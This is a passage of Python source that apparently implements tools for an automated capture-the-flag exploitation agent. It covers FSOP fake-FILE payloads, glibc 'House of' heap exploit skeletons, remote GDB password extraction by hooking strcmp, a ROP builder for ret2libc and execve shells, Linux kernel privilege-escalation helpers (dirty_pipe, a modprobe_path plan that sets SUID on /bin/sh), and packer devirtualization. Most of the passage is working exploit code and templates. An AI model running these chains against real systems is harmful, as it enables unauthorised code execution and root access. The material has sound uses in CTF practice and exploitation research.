                f"fake_file[0:8]     = b'/bin/sh\\x00'\n"
                f"# _IO_write_ptr > _IO_write_base → triggers __overflow\n"
                f"flat_into(fake_file, {{0x20: 0, 0x28: 1}})\n"
                f"# _mode must be > 0 for _IO_wfile_overflow path\n"
                f"flat_into(fake_file, {{0xc0: 1}})\n"
                f"# _wide_data pointer\n"
                f"flat_into(fake_file, {{0xa0: fake_wide_data_addr}})\n"
                f"# vtable = _IO_wfile_jumps (passes validation)\n"
                f"flat_into(fake_file, {{0xd8: io_wfile_jumps}})\n"
                f"# fake _wide_data._wide_vtable at offset 0xe0\n"
                f"flat_into(fake_file, {{0x100 + 0xe0: fake_wide_vtable_addr}})\n"
                f"# fake vtable[7] = system (doallocate slot)\n"
                f"flat_into(fake_file, {{0x200 + 7*8: system}})\n\n"
                f"# Step 4: Write fake_file to heap, trigger exit()\n"
                f"write_primitive(fake_file_addr, bytes(fake_file))\n"
                f"large_bin_attack_target(_IO_list_all, fake_file_addr)\n"
                f"trigger_malloc_or_exit()\n"
                f"p.interactive()")

    return ("FSOP operations:\n"
            "  detect      — check glibc version, identify applicable technique\n"
            "  fake_file   — build fake _IO_FILE struct bytes\n"
            "  wide_data   — _wide_data vtable attack (glibc 2.35+)\n"
            "  _io_list_all— overwrite _IO_list_all chain\n"
            "  skeleton    — full pwntools exploit skeleton")


def tool_gdb_remote(host: str, port: int = 1234, binary_path: str = "",
                    operation: str = "connect", script: str = "",
                    find_addr: str = "", avoid_addrs: list = None,
                    timeout: int = 30) -> str:
    """Remote GDB debugging for challenges running gdbserver.
    Ops: connect (verify gdbserver is alive + get arch/regs),
    run_script (execute GDB script against remote target),
    pwntools_remote (pwntools GDB remote attach with pwndbg),
    angr_remote (angr exploration against remote binary snapshot),
    find_password (hook strcmp/memcmp via GDB + send candidates to extract comparison)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""
    avoid = avoid_addrs or []

    if operation == "connect":
        # Try both raw TCP probe and GDB handshake
        code = f"""
import socket, time
host, port = {repr(host)}, {port}
# Try raw TCP probe (gdbserver speaks GDB RSP)
try:
    s = socket.create_connection((host, port), timeout=5)
    s.send(b'+$qSupported:multiprocess+;swbreak+#c6')
    time.sleep(0.3)
    data = s.recv(1024)
    s.close()
    print(f"[gdbserver] Connected! Response: {{data[:80]}}")
    if b'PacketSize' in data:
        print("[gdbserver] GDB RSP handshake successful")
except Exception as ex:
    print(f"Connection failed: {{ex}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "run_script":
        if not script:
            return "Provide script= (GDB commands, one per line)"
        if not sp:
            return "Provide binary_path= for symbol resolution"
        gdb_script = f"""
set pagination off
set confirm off
target remote {host}:{port}
{script}
quit
"""
        tmp = f"/tmp/gdb_script_{int(time.time())}.gdb"
        with open(tmp, "w") as f: f.write(gdb_script)
        cmd = f"gdb -batch -x '{tmp}' '{sp}' 2>&1" if sp else f"gdb -batch -x '{tmp}' 2>&1"
        out = _shell(cmd, timeout=timeout)
        try: os.remove(tmp)
        except: pass
        return out

    if operation == "pwntools_remote":
        code = f"""
from pwn import *
import os
context.log_level = 'info'
{'context.binary = ELF(repr(sp))' if sp else '# no binary'}
gdb_script = {repr(script or "continue")}
try:
    # Connect to gdbserver via pwntools
    io = remote({repr(host)}, {port})
    print(f"Connected to {{host}}:{{port}}")
    # For gdbserver, we communicate via GDB RSP protocol
    # Send initial packet
    io.send(b'+$qSupported#37')
    resp = io.recv(timeout=3)
    print(f"RSP response: {{resp[:100]}}")
    io.close()
except Exception as ex:
    print(f"Error: {{ex}}")

# Alternative: spawn GDB and attach
print("\n--- GDB attach command ---")
print(f"gdb {repr(sp) if sp else ''} -ex 'target remote {host}:{port}' -ex {repr(script.splitlines()[0] if script else 'info registers')}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "find_password":
        """Hook comparison functions via GDB to extract what the binary compares against."""
        if not sp:
            return "Provide binary_path= for symbol resolution"
        gdb_script = f"""set pagination off
set confirm off
target remote {host}:{port}
# Hook strcmp, strncmp, memcmp
break strcmp
break strncmp
break memcmp
commands 1
  silent
  set $s1 = (char*)$rdi
  set $s2 = (char*)$rsi
  printf "strcmp: %%s vs %%s\n", $s1, $s2
  continue
end
commands 2
  silent
  printf "strncmp: %%s vs %%s\n", (char*)$rdi, (char*)$rsi
  continue
end
commands 3
  silent
  printf "memcmp: %%s vs %%s\n", (char*)$rdi, (char*)$rsi
  continue
end
continue
"""
        tmp = f"/tmp/gdb_hook_{int(time.time())}.gdb"
        with open(tmp, "w") as f: f.write(gdb_script)
        out = _shell(f"timeout {timeout} gdb -batch -x '{tmp}' '{sp}' 2>&1", timeout=timeout+5)
        try: os.remove(tmp)
        except: pass
        return out

    if operation == "angr_remote":
        if not sp or not find_addr:
            return "Provide binary_path= and find_addr= for angr exploration"
        code = f"""
import angr, claripy
proj = angr.Project({repr(sp)}, load_options={{'auto_load_libs': False}})
find = {int(find_addr, 16) if find_addr.startswith('0x') else int(find_addr, 16)}
avoid = {[int(a, 16) if a.startswith('0x') else int(a, 16) for a in avoid]}
state = proj.factory.entry_state()
sm = proj.factory.simulation_manager(state)
sm.explore(find=find, avoid=avoid)
if sm.found:
    s = sm.found[0]
    stdin = s.posix.dumps(0)
    print(f"[angr] Found! stdin = {{repr(stdin)}}")
else:
    print("[angr] No path found")
"""
        return tool_execute_python(code, timeout=120)

    return "Operations: connect, run_script, pwntools_remote, find_password, angr_remote"


def tool_house_of_exploit(binary_path: str, technique: str = "detect",
                           libc_path: str = "", libc_version: str = "",
                           target_addr: str = "0", cmd: str = "/bin/sh") -> str:
    """House of * heap exploitation techniques for glibc ≥2.31.
    Techniques: detect, orange (unsorted_bin→__malloc_hook), force (fastbin→tcache),
    spirit (large_bin→AAW), einherjar (consolidation→overlap), lore (large_bin attack v2),
    tangerine (tcache stash), posion_null_byte, off_by_one."""

    if technique == "detect":
        code = f"""
import subprocess, re
bp = {repr(binary_path)}
r = subprocess.run(['checksec','--file='+bp], capture_output=True, text=True)
print("Protections:\\n" + r.stdout)
# Determine libc version
libc = {repr(libc_path)} or {repr(libc_version)}
if libc:
    if 'libc' in libc:
        ver_match = re.search(r'(2\\.\\d+)', libc)
        ver = ver_match.group(1) if ver_match else '?'
    else:
        ver = libc
    print(f"\\nLibc version: {{ver}}")
    major_minor = float(ver) if ver != '?' else 0
    print("\\nApplicable House of * techniques:")
    if major_minor < 2.27:
        print("  House of Orange: __malloc_hook via unsorted bin (classic)")
        print("  House of Force: top chunk size overwrite → arbitrary malloc")
        print("  House of Einherjar: off-by-null → consolidation")
    if major_minor >= 2.27 and major_minor < 2.32:
        print("  House of Force: still works (no tcache size check)")
        print("  House of Tangerine: tcache stash unlink+ attack")
        print("  House of Lore: smallbin bk pointer overwrite")
    if major_minor >= 2.32:
        print("  House of Spirit: free fake chunk → tcache")
        print("  House of Lore v2: large bin attack → anywhere write")
        print("  Poison null byte: off-by-null consolidation (still possible)")
        print("  tcache house of spirit (tcache_entry.key bypass needed)")
    print("\\nCurrent meta: glibc ≥2.35 removed __free_hook/__malloc_hook")
    print("Use: _IO_list_all (FSOP) or large_bin_attack → mp_.tcache_bins overwrite")
else:
    print("Provide libc_path or libc_version to get specific technique recommendations")
"""
        return tool_execute_python(code, timeout=15)

    SKELETONS = {
        "orange": '''# House of Orange — glibc < 2.27, __malloc_hook via unsorted bin AW
# Requires: heap overflow into top chunk size field, leak heap+libc
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")
p = process([elf.path])

# Step 1: shrink top chunk size to 0x21 (must be page-aligned after + size)
# overwrite top_chunk->size with (valid_size & ~PREV_INUSE) that crosses page boundary
# e.g., top_chunk at 0x...f18, write 0xd01 as size → next malloc > size triggers sysmalloc → frees old top

# Step 2: old top lands in unsorted bin as 0xd00 chunk
# Step 3: leak libc via malloc → print unsorted bin chunk (bk/fd = main_arena offsets)

# Step 4: abuse House of Orange — overwrite _IO_list_all via unsorted bin attack
# Set fake FILE struct with vtable → __overflow → system("/bin/sh")
# (pre-2.24 vtable check)

io_list_all = libc.sym._IO_list_all
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh"))

fake_file  = flat(
    p64(0), p64(0x61),        # chunk header (smallbin size 0x60)
    p64(0), p64(io_list_all - 0x10),   # fd=0, bk=_IO_list_all-0x10 (unsorted attack)
    b"\\x00"*8, p64(2),         # _IO_write_base, _IO_write_ptr triggers fp->_mode < 0
    b"\\x00"*0x20,
    p64(system),              # _IO_buf_base (used as argument)
    b"\\x00"*8,
    p64(binsh),               # _IO_save_end
    # ... vtable pointer at offset 0xd8 pointing to fake vtable
)
# Trigger: malloc → abort → _IO_flush_all_lockp → __overflow on fake FILE''',

        "force": '''# House of Force — arbitrary malloc to any address via top chunk overwrite
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")
p = process([elf.path])

# Requires: overflow into top chunk size field, control malloc size

# Step 1: overwrite top chunk size with 0xffffffffffffffff
# top_chunk_addr + 0x10 (data area) = current top
# payload = b"A"*overflow_amount + p64(0xffffffffffffffff)

# Step 2: malloc((target_addr - top_addr - 0x20) & (2**64-1))
# This wraps top chunk to target_addr

# Step 3: next malloc returns target_addr
# overwrite __malloc_hook = one_gadget

target = {target_addr}  # e.g. libc.sym.__malloc_hook
''',

        "spirit": '''# House of Spirit — free fake chunk into tcache/fastbin
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")

# Requires: control over a pointer fed to free(), control fake chunk metadata nearby
# Fake chunk: size field, prev_size of NEXT chunk (for fastbin: just size; for tcache: size + key)

fake_chunk_addr = {target_addr}  # address of fake chunk
size = 0x40  # pick any tcache size

# Layout fake chunk:
# [0x00] prev_size (any)
# [0x08] size = 0x41 (0x40 + PREV_INUSE)  ← write this
# [0x10] fd (tcache: next ptr)
# [0x18] key (tcache key, needs to be 0 or valid tcache addr to avoid abort)

# After free(fake_chunk_addr + 0x10):
# tcache[size] = fake_chunk_addr + 0x10
# malloc(size-0x10) → returns fake_chunk_addr + 0x10 → arbitrary write
''',

        "lore": '''# House of Lore v2 (glibc ≥2.32) — large bin attack → anywhere write
# Requires: chunk in large bin, overflow into bk_nextsize
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")

# Large bin attack mechanism:
# When a chunk is inserted into large bin:
#   victim->bk_nextsize->fd_nextsize = victim   (write victim_addr → target-0x20+0x18 offset)
# So: set victim->bk_nextsize = target - 0x20

# Targets on glibc ≥2.35 (no __free_hook):
target_candidates = [
    "mp_.tcache_bins",       # control tcache allocation size range
    "_IO_list_all",          # FSOP → RCE (combine with tool_fsop)
    "tls_dtor_list",         # thread-local destructor list
    "global_max_fast",       # expand fastbin range
]

# Practical skeleton:
# 1. Allocate large chunk A (> 1024 bytes), free → large bin
# 2. Overflow: write A->bk_nextsize = target - 0x20
# 3. Allocate same-size chunk B (triggers large bin insertion of B, attacks target)
# 4. target now contains pointer to B → use as write primitive
''',

        "einherjar": '''# House of Einherjar — off-by-null → controlled consolidation → chunk overlap
from pwn import *
elf = ELF("{bp}"); libc = ELF("{lp}")

# Requires: off-by-null (1 byte overflow writing 0x00 into next chunk's size)
# Effect: clears PREV_INUSE bit → triggers backward consolidation with fake prev chunk

# Step 1: Create fake prev chunk in controlled region
# fake_chunk at heap_base + offset, size must equal (real_prev_size)
# fake_chunk->fd, bk must bypass unlink macro: fd->bk == fake_chunk, bk->fd == fake_chunk

# Step 2: Set up target chunk B after fake gap
# Set B->prev_size = (B_addr - fake_chunk_addr)
# Overflow B-1 to clear B->PREV_INUSE

# Step 3: free(B) → consolidates back with fake_chunk → overlapping chunk
# Use overlapping chunk to overwrite live allocation (fd/bk pointers)
''',
    }

    if technique in SKELETONS:
        skeleton = SKELETONS[technique].replace("{bp}", binary_path).replace("{lp}", libc_path).replace("{target_addr}", target_addr)
        return f"=== House of {technique.capitalize()} skeleton ===\n\n{skeleton}\n\nNext: ghidra_decompile to find UAF/overflow primitive, libc_lookup for offsets, heap_analysis to verify chunk layout"

    if technique == "poison_null_byte":
        return ("Poison Null Byte (off-by-null) technique:\n\n"
                "Applicable: glibc ≤2.28 (clear PREV_INUSE) or controlled prev_size write\n\n"
                "Mechanism:\n"
                "1. Allocate A (0x100), B (0x200), C (any) — B is victim\n"
                "2. Overflow last byte of A → B->size = 0x200 (clears PREV_INUSE bit)\n"
                "   Also need: B->prev_size must == sizeof(A) for consolidation math\n"
                "3. Free B → glibc backward-consolidates with fake A (thinks it's free)\n"
                "4. Result: overlapping chunk spans A+B allocation\n"
                "5. Malloc from overlapping region → overwrite B's live metadata\n\n"
                "glibc 2.29+ mitigation: checks prev_size matches chunk header size\n"
                "Bypass: control prev_size via another overflow / use House of Einherjar instead")

    if technique == "off_by_one":
        return ("Off-By-One exploitation paths:\n\n"
                "Target: next chunk's size field (1 byte write)\n\n"
                "Path 1 (expand chunk):\n"
                "  Write 0x?1 → 0x?1+0x?0 → expanded chunk overlaps next allocation\n\n"
                "Path 2 (shrink chunk, poison null byte):\n"
                "  Write 0x00 → clears PREV_INUSE → House of Einherjar\n\n"
                "Path 3 (change size to exact tcache size):\n"
                "  Turn 0x41 → 0x31 → chunk gets freed into wrong tcache bin → type confusion\n\n"
                "Finding off-by-one:\n"
                "  angr_solve with find=crash_addr, stdin_len=N\n"
                "  afl_fuzz with short inputs, look for heap corruption crashes\n"
                "  Source audit: strcpy/sprintf/gets without size check")

    return ("House of * techniques:\n"
            "  detect        — identify applicable technique for your glibc version\n"
            "  orange        — unsorted bin → __malloc_hook (glibc <2.27)\n"
            "  force         — top chunk overwrite → arbitrary malloc\n"
            "  spirit        — free fake chunk into tcache\n"
            "  lore          — large bin bk_nextsize attack → arbitrary write\n"
            "  einherjar     — off-by-null → consolidation overlap\n"
            "  poison_null_byte — off-by-null → PREV_INUSE manipulation\n"
            "  off_by_one    — generic off-by-one exploitation paths")


def tool_kernel_lpe(operation: str = "detect", module_path: str = "",
                     vuln_type: str = "", target_cred: str = "commit_creds") -> str:
    """Linux kernel LPE exploitation: detect (kernel version + mitigations),
    dirty_pipe (CVE-2022-0847), userfaultfd_uaf, modprobe_path, ret2usr,
    rop_chain (kernel ROP with SMEP/SMAP bypass), slub_overflow, slab_uaf, skeleton."""

    if operation == "detect":
        code = f"""
import subprocess, platform, os

print("=== Kernel info ===")
try:
    kver = platform.release()
    print(f"Version: {{kver}}")
except: pass

print()
print("=== Mitigations ===")
checks = [
    ("/proc/sys/kernel/kptr_restrict", "kptr_restrict"),
    ("/proc/sys/kernel/dmesg_restrict", "dmesg_restrict"),
    ("/proc/sys/kernel/perf_event_paranoid", "perf_paranoid"),
    ("/proc/sys/kernel/unprivileged_userns_clone", "userns_clone"),
    ("/proc/sys/kernel/unprivileged_bpf_disabled", "bpf_disabled"),
    ("/proc/sys/net/core/bpf_jit_harden", "jit_harden"),
]
for path, name in checks:
    try:
        val = open(path).read().strip()
        print(f"  {{name}}: {{val}}")
    except: print(f"  {{name}}: (unreadable)")

print()
print("=== CPU mitigations ===")
try:
    cpuinfo = open("/proc/cpuinfo").read()
    import re
    flags = re.search(r'flags\\s*:\\s*(.+)', cpuinfo)
    if flags:
        cpu_flags = flags.group(1).split()
        for f in ['smep','smap','pti','ibrs','stibp']:
            print(f"  {{f}}: {{'YES' if f in cpu_flags else 'no'}}")
except: pass

print()
print("=== Boot cmdline (KASLR/SMEP/SMAP) ===")
try:
    print(open("/proc/cmdline").read()[:200])
except: pass

print()
print("=== Applicable CVEs (manual check) ===")
print("  dirty_pipe  (CVE-2022-0847): kernel 5.8 ≤ v < 5.16.11/5.15.25/5.10.102")
print("  dirty_cow   (CVE-2016-5195): kernel < 4.8.3")
print("  CVE-2023-0386: overlayfs privilege escalation")
print("  CVE-2022-2588: route4_change UAF → LPE")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "dirty_pipe":
        return _shell("uname -a; grep -R \"Dirty Pipe\\|CVE-2022-0847\" /usr/share/doc 2>/dev/null | head -10; "
                     "echo 'If kernel vulnerable, compile PoC and target writable file with page-cache overwrite.'", timeout=12)

    if operation == "modprobe_path":
        return "\n".join([
            "modprobe_path executable plan:",
            "1) Gain arbitrary kernel write primitive.",
            "2) Overwrite modprobe_path with /tmp/x.",
            "3) Write /tmp/x script: chmod u+s /bin/sh.",
            "4) Trigger request_module via unknown-bin execution.",
            "5) Execute /bin/sh -p for root shell.",
        ])

    if operation == "userfaultfd_uaf":
        return _shell("sysctl vm.unprivileged_userfaultfd 2>/dev/null; "
                     "echo 'If enabled, use userfaultfd stall to widen race window around UAF/free path.'", timeout=10)

    if operation == "ret2usr":
        return _shell("grep -E 'smep|smap|pti|kaslr' /proc/cpuinfo 2>/dev/null | head -5; "
                     "echo 'ret2usr requires SMEP/SMAP bypass or CR4 control before jumping to userland payload.'", timeout=10)

    if operation == "slub_overflow":
        return "\n".join([
            "SLUB overflow executable workflow:",
            "- Identify kmalloc cache of victim object (slabinfo / dmesg hints).",
            "- Groom with controlled allocations/frees in same cache.",
            "- Overflow adjacent object field/function pointer.",
            "- Pivot to cred overwrite or modprobe_path chain.",
        ])

    return ("Kernel LPE operations:\n"
            "  detect        — kernel version, mitigations, applicable CVEs\n"
            "  dirty_pipe    — CVE-2022-0847 (kernel 5.8 - 5.16.11)\n"
            "  modprobe_path — overwrite modprobe_path for root command execution\n"
            "  userfaultfd_uaf— race condition slowdown primitive\n"
            "  ret2usr       — with/without SMEP/SMAP/KPTI bypass\n"
            "  slub_overflow — SLUB heap object confusion\n"
            "  skeleton      — full LPE exploit skeleton")


def tool_rop_chain(binary_path: str, operation: str = "build", goal: str = "shell",
                   extra_gadgets: str = "", libc_path: str = "", base_addr: str = "0") -> str:
    """ROP chain builder wrapping pwntools ROP(). Handles stack alignment, ret2libc, syscall chains."""
    bp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    lp = (_w2l(libc_path) if (IS_WINDOWS and USE_WSL) else libc_path) if libc_path else ""

    if operation == "gadgets":
        return _shell(f"ROPgadget --binary '{bp}' --rop 2>/dev/null | head -80 || "
                      f"ropper -f '{bp}' 2>/dev/null | head -80 || "
                      f"objdump -d '{bp}' | grep -E 'ret|pop|mov' | head -60")

    if operation == "checksec":
        return _shell(f"checksec --file='{bp}' 2>/dev/null || python3 -m pwnlib.util.misc 2>/dev/null", timeout=10)

    code = f"""
import sys
try:
    from pwn import *
    context.log_level = 'error'
    elf = ELF('{bp}', checksec=False)
    rop = ROP(elf)
    goal = '{goal}'
    base = {base_addr}
    if base: elf.address = base

    {"libc = ELF('" + lp + "', checksec=False); libc_rop = ROP(libc)" if lp else "libc = None; libc_rop = None"}

    results = []

    if goal in ('shell', 'ret2libc'):
        # Try ret2libc: system("/bin/sh")
        try:
            binsh = next(elf.search(b'/bin/sh\\x00'), None)
            if binsh is None and libc:
                binsh = next(libc.search(b'/bin/sh\\x00'), None)
            sys_addr = elf.plt.get('system') or (libc.symbols.get('system') if libc else None)
            if sys_addr and binsh:
                # Stack alignment: add ret gadget before call on x86_64
                try:
                    ret_gadget = rop.find_gadget(['ret'])[0]
                except: ret_gadget = None
                chain = b''
                if ret_gadget: chain += p64(ret_gadget)
                chain += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
                chain += p64(binsh)
                chain += p64(sys_addr)
                results.append(f"ret2libc chain ({{len(chain)}} bytes):")
                results.append(f"  /bin/sh @ {{hex(binsh)}}")
                results.append(f"  system() @ {{hex(sys_addr)}}")
                results.append(f"  chain hex: {{chain.hex()}}")
                results.append(f"  pwntools snippet:")
                results.append(f"    rop = ROP(elf)")
                if ret_gadget: results.append(f"    rop.raw(p64({{hex(ret_gadget)}}))")
                results.append(f"    rop.call({{hex(sys_addr)}}, [{{hex(binsh)}}])")
            else:
                results.append("ret2libc: /bin/sh or system() not found in binary")
                if not libc: results.append("  Hint: provide libc_path for libc-based ROP")
        except Exception as ex:
            results.append(f"ret2libc attempt failed: {{ex}}")

    if goal in ('syscall', 'execve', 'shell'):
        # Try execve via syscall gadgets
        try:
            syscall_g = rop.find_gadget(['syscall', 'ret']) or rop.find_gadget(['syscall'])
            rax_g = rop.find_gadget(['pop rax', 'ret'])
            rdi_g = rop.find_gadget(['pop rdi', 'ret'])
            rsi_g = rop.find_gadget(['pop rsi', 'ret']) or rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
            rdx_g = rop.find_gadget(['pop rdx', 'ret']) or rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])
            binsh = next(elf.search(b'/bin/sh\\x00'), None)
            if all([syscall_g, rax_g, rdi_g, rsi_g, rdx_g, binsh]):
                chain = (p64(rax_g[0]) + p64(59) +       # execve syscall nr
                         p64(rdi_g[0]) + p64(binsh) +
                         p64(rsi_g[0]) + p64(0) + (p64(0) if len(rsi_g)>2 else b'') +
                         p64(rdx_g[0]) + p64(0) + (p64(0) if len(rdx_g)>2 else b'') +
                         p64(syscall_g[0]))
                results.append(f"\\nexecve syscall chain ({{len(chain)}} bytes):")
                results.append(f"  pop rax @ {{hex(rax_g[0])}}, pop rdi @ {{hex(rdi_g[0])}}")
                results.append(f"  pop rsi @ {{hex(rsi_g[0])}}, pop rdx @ {{hex(rdx_g[0])}}")
                results.append(f"  syscall @ {{hex(syscall_g[0])}}, /bin/sh @ {{hex(binsh)}}")
                results.append(f"  chain hex: {{chain.hex()}}")
            else:
                missing = [n for n,g in [('syscall',syscall_g),('pop rax',rax_g),('pop rdi',rdi_g),
                                          ('pop rsi',rsi_g),('pop rdx',rdx_g),('/bin/sh',binsh)] if not g]
                results.append(f"\\nexecve syscall: missing gadgets: {{missing}}")
        except Exception as ex:
            results.append(f"execve attempt failed: {{ex}}")

    if goal == "write_what_where":
        try:
            rdi_g = rop.find_gadget(['pop rdi', 'ret'])
            rsi_g = rop.find_gadget(['pop rsi', 'ret']) or rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
            results.append(f"\\nwrite-what-where gadgets:")
            if rdi_g: results.append(f"  pop rdi; ret @ {{hex(rdi_g[0])}}")
            if rsi_g: results.append(f"  pop rsi; ret @ {{hex(rsi_g[0])}}")
            write_g = rop.find_gadget(['mov [rdi], rsi', 'ret']) or rop.find_gadget(['mov [rdi], rax', 'ret'])
            if write_g: results.append(f"  write gadget @ {{hex(write_g[0])}}")
        except Exception as ex:
            results.append(f"write gadgets failed: {{ex}}")

    if goal == "one_gadget" or '{extra_gadgets}' == 'one_gadget':
        import subprocess
        og = subprocess.run(['one_gadget', '{bp}'] + (['{lp}'] if '{lp}' else []),
                            capture_output=True, text=True, timeout=15)
        results.append(f"\\none_gadget output:\\n{{og.stdout[:1000] or og.stderr[:500]}}")

    # Always dump available gadget categories
    results.append(f"\\n=== Available gadget summary ===")
    for desc, gadget in [("ret", ['ret']), ("pop rdi", ['pop rdi','ret']),
                          ("pop rsi", ['pop rsi','ret']), ("pop rdx", ['pop rdx','ret']),
                          ("pop rax", ['pop rax','ret']), ("syscall", ['syscall','ret']),
                          ("leave;ret", ['leave','ret'])]:
        try:
            g = rop.find_gadget(gadget)
            results.append(f"  {{desc}}: {{hex(g[0]) if g else 'NOT FOUND'}}")
        except: results.append(f"  {{desc}}: NOT FOUND")

    print('\\n'.join(results))
except ImportError as e:
    print(f"pwntools not installed: {{e}}\\nFalling back to ROPgadget...")
    import subprocess
    r = subprocess.run(['ROPgadget','--binary','{bp}','--rop'],
                       capture_output=True, text=True, timeout=30)
    print(r.stdout[:3000] or r.stderr[:1000])
except Exception as e:
    import traceback; traceback.print_exc()
    print(f"ROP chain error: {{e}}")
"""
    return tool_execute_python(code, timeout=60)


def tool_vm_devirt(binary_path: str, operation: str = "detect",
                    handler_addr: str = "", opcode_map: dict = None) -> str:
    """VM devirtualization / deobfuscation for VMProtect/Themida/custom VM.
    Ops: detect (identify VM type + handler table), trace (trace execution to build opcode map),
    lift (lift traced bytecode to C pseudocode), devirt_skeleton (custom VM analysis script)."""

    bp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path

    if operation == "detect":
        code = f"""
import subprocess, re
bp = {repr(bp)}
print("=== Commercial protector detection ===")
r = subprocess.run(['strings', bp], capture_output=True, text=True)
s = r.stdout
sigs = {{
    'VMProtect':   ['VMProtect', 'vmp_', '.vmp0', '.vmp1', 'vmp_begin', 'vmp_end'],
    'Themida':     ['Themida', 'WinLicense', 'TFIDO', 'OREANS'],
    'Enigma':      ['Enigma Protector', 'enigma_', '.enigma'],
    'ASProtect':   ['ASProtect', 'aspr'],
    'Obsidium':    ['Obsidium'],
    'Safengine':   ['Safengine'],
    'Code Virtualizer': ['CODE_VIRTUALIZER', 'CV_VIRTUALIZER'],
}}
for name, markers in sigs.items():
    if any(m in s for m in markers):
        print(f"[!] Detected: {{name}}")
# Entropy scan for packed sections
r2 = subprocess.run(['objdump', '-h', bp], capture_output=True, text=True)
print()
print("=== Section analysis ===")
for line in r2.stdout.split('\\n'):
    if 'vmp' in line.lower() or 'themida' in line.lower() or 'oreans' in line.lower():
        print(f"  Suspicious section: {{line.strip()}}")
print()
print("=== Custom VM detection heuristics ===")
r3 = subprocess.run(['objdump', '-d', bp], capture_output=True, text=True, timeout=30)
asm = r3.stdout
# Dispatcher pattern: large switch/jmp-table
jmps = len(re.findall(r'jmp\\s+\\*', asm))
mov_dispatches = len(re.findall(r'movzx.*\\[', asm))
print(f"  Indirect JMPs (jmp [reg+offset]): {{jmps}}")
print(f"  MOVZX from memory (potential opcode fetch): {{mov_dispatches}}")
if jmps > 10:
    print("  [!] Many indirect jumps — possible VM dispatcher")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "trace":
        return (f"VM handler tracing approach:\n\n"
                f"1. Frida-based tracer (dynamic):\n"
                f"   Use frida_trace with script to trace all basic block transitions\n"
                f"   frida_trace('{binary_path}', script='''\n"
                f"     Stalker.follow(Process.mainThread().id, {{\n"
                f"       events: {{ compile: true }},\n"
                f"       onReceive(events) {{\n"
                f"         const bbs = Stalker.parse(events, {{stringify: true}});\n"
                f"         bbs.forEach(bb => send(bb));\n"
                f"       }}\n"
                f"     }});\n"
                f"   ''')\n\n"
                f"2. PIN-based tracer:\n"
                f"   pin -t inscount0.so -- {binary_path}\n"
                f"   Builds full execution trace\n\n"
                f"3. Unicorn emulation (for isolated VM handlers):\n"
                f"   unicorn_emulate(arch='x86_64', code=handler_bytes_hex)\n"
                f"   Step through handler, log state transitions\n\n"
                f"4. QEMU user-mode + GDB:\n"
                f"   qemu-x86_64 -g 1234 {binary_path}\n"
                f"   gdb -ex 'target remote :1234' -ex 'b *{handler_addr}'\n"
                f"   Log: RIP, handler_opcode, virtual registers at each dispatch\n\n"
                f"Analysis goal: build opcode_map = {{bytecode_byte: native_semantics}}")

    if operation == "lift":
        if not opcode_map:
            return ("Provide opcode_map={{byte_val: 'semantic'}} from trace analysis.\n"
                    "Example: {{0x01: 'PUSH reg', 0x02: 'POP reg', 0x10: 'ADD', 0x11: 'SUB',...}}\n"
                    "Then use custom_cpu_emulate() to write a full interpreter.")
        lines = [f"VM lift: opcode map has {len(opcode_map)} entries\n"]
        for byte_val, semantic in sorted(opcode_map.items())[:20]:
            lines.append(f"  {hex(byte_val)}: {semantic}")
        lines.append("\nGenerate custom CPU emulator:")
        lines.append("  custom_cpu_emulate(code=<your_vm_interpreter>, operation='run')")
        return "\n".join(lines)

    if operation == "devirt_skeleton":
        return "\n".join([
            "VM devirtualization skeleton:",
            "- Trace dispatcher loop and log (pc, opcode, regs) each step.",
            "- Build opcode_map from observed handlers.",
            "- Lift bytecode to pseudo-IR and replay with custom_cpu_emulate.",
            "- Validate by matching output on known test vectors.",
        ])

    return "Operations: detect, trace, lift, devirt_skeleton"


def tool_one_gadget(libc_path: str = "", operation: str = "find",
                    leak_addr: str = "", leak_symbol: str = "puts",
                    constraints: dict = None) -> str:
    """Wrapper around one_gadget gem (github.com/david942j/one_gadget).
    Finds single-gadget RCE addresses in libc that give a shell when register
    constraints are met.
    Ops: find (list all gadgets + constraints), best (highest probability gadget),
    find_with_leak (resolve gadgets to absolute addresses given a libc leak),
    check_constraints (verify which gadgets are usable given register state)."""

    sp = (_w2l(libc_path) if (IS_WINDOWS and USE_WSL) else libc_path) if libc_path else ""

    if operation in ("find", "best"):
        if not sp: return "Provide libc_path="
        out = _shell(f"one_gadget '{sp}' 2>&1", timeout=20)
        if "not found" in out or "command not found" in out:
            # Fallback: use ROPgadget to find execve gadgets
            out2 = _shell(f"ROPgadget --binary '{sp}' --rop 2>/dev/null | grep -E 'execve|/bin/sh' | head -20", timeout=20)
            return (f"one_gadget not installed. Install: gem install one_gadget\n"
                    f"ROPgadget fallback (execve patterns):\n{out2}")
        if operation == "best":
            lines = [l for l in out.splitlines() if l.startswith("0x")]
            return lines[0] if lines else out
        return out

    if operation == "find_with_leak":
        if not leak_addr or not sp:
            return "Provide libc_path= and leak_addr= (hex address of known symbol)"
        code = f"""
import subprocess, re
libc_path = {repr(sp)}
leak = {int(leak_addr, 16)}
symbol = {repr(leak_symbol)}

# Get symbol offset in libc
r = subprocess.run(['nm', '-D', libc_path], capture_output=True, text=True, timeout=10)
sym_offset = None
for line in r.stdout.splitlines():
    if f' {{symbol}}' in line or f'_{{symbol}}' in line:
        parts = line.split()
        if parts[0]:
            try:
                sym_offset = int(parts[0], 16)
                break
            except: pass

if sym_offset is None:
    print(f'Symbol {{symbol}} not found in {{libc_path}}')
else:
    libc_base = leak - sym_offset
    print(f'libc base: {{hex(libc_base)}}')
    
    # Get one_gadgets
    r2 = subprocess.run(['one_gadget', libc_path], capture_output=True, text=True, timeout=20)
    if r2.returncode == 0:
        for line in r2.stdout.splitlines():
            if line.startswith('0x'):
                off = int(line.split()[0], 16)
